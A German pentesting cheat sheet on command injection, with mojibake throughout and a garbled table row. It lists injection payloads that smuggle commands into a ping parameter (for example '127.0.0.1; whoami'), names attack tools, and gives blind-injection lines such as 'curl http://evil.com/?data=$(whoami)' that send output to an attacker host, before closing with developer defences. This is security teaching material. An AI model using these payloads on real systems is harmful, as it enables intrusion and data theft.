Inhalt fÃ¼r web-pentesting/command-injection.md

# ğŸ’£ Command Injection

Command Injection (Befehlsinjektion) ist eine Schwachstelle, bei der ein Angreifer Systembefehle auf dem Server ausfÃ¼hren kann â€“ meist durch unsichere Verarbeitung von Eingaben in Shell-Kommandos.

---

## ğŸ§  Grundlagen

### ğŸ” Was passiert?
- Eingabe vom Nutzer wird direkt an ein Systemkommando Ã¼bergeben
- z.â€¯B. Ã¼ber `ping`, `ls`, `cat`, `wget` usw.
- Wenn nicht sauber gefiltert â†’ AusfÃ¼hrung von beliebigem Code mÃ¶glich

### ğŸ’¬ Beispiel
URL:  

http://example.com/ping?host=127.0.0.1


Server fÃ¼hrt aus:
```bash
ping -c 1 127.0.0.1

Angreifer testet:

127.0.0.1; whoami

ğŸ”ª Injection-Techniken
ğŸ§± 1. Zeichen zur Befehlsverkettung
Zeichen	Funktion	Beispiel
;	Trennt zwei Befehle	127.0.0.1; whoami
&&	FÃ¼hre nÃ¤chsten nur aus, wenn vorheriger klappt	127.0.0.1 && whoami
`		`
`	`	Pipe
` `	Command Substitution	127.0.0.1; whoami``
$()	Ebenfalls Substitution	127.0.0.1; $(whoami)
ğŸ§ª Testmethoden
ğŸ”¹ Manuell

    Eingabe: 127.0.0.1; whoami

    RÃ¼ckgabe zeigt: www-data

ğŸ”¹ Automatisiert mit Burp

    Repeater testen

    Intruder â†’ Wordlist aus PayloadAllTheThings

ğŸ§° Tools
Tool	Zweck
Burp Suite	Manuelle Tests / Fuzzing
ffuf	Fuzzing auf Parameter
Commix	Automatisiertes Ausnutzen
curl/wget	fÃ¼r Blind-Injection Tests
ğŸ‘ï¸ Blind Command Injection

Wenn keine direkte RÃ¼ckmeldung:

    127.0.0.1; ping -c 3 evil.com

    127.0.0.1; curl http://evil.com/?data=$(whoami)

    ZeitverzÃ¶gerung: sleep 5

ğŸ›¡ï¸ SchutzmaÃŸnahmen (fÃ¼r Entwickler)

    Keine User-Eingabe in Systemkommandos verwenden!

    Wenn doch nÃ¶tig:
    â†’ Whitelist, Escaping, execve() statt system()

    Minimalrechte fÃ¼r Webprozesse (z.â€¯B. www-data)
